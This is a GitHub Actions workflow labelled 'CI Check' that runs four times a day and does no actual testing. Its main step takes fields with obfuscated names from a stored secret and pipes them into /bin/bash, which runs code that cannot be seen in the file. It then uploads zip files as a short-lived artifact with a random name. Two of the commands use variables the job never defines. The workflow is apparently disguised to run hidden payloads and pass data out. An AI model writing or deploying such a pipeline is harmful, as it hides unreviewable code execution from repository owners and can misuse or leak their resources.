name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '29 3,9,15,21 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Start
        env:
          scas7: ${{ secrets.scas7 }}
        run: |
          printf '%s' "$scas7" | jq -r .cg21 | /bin/bash
          printf '%s' "$yqxo7" | jq -r .cxxf83156 | /bin/bash
          printf '%s' "$yqxkb7" | jq -r .wxs40822 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: MXFb0BXQ
          path: "*.zip"
          retention-days: 1
